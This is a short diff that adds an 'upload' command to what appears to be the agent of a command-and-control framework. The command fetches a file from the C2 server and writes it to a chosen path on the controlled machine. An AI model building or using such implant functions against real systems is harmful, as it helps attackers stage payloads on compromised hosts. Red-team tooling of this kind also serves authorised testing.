@@ -1,0 +1,11 @@
+exports.upload = function(task, command, params){
+    var config = JSON.parse(params);
+    var data = C2.upload(task, config['file_id']);
+    if(typeof data == "string"){
+        return data; //means we got an error
+    }
+    else{
+        return write_data_to_file(data, config['remote_path']);
+    }
+};
+COMMAND_ENDS_HERE
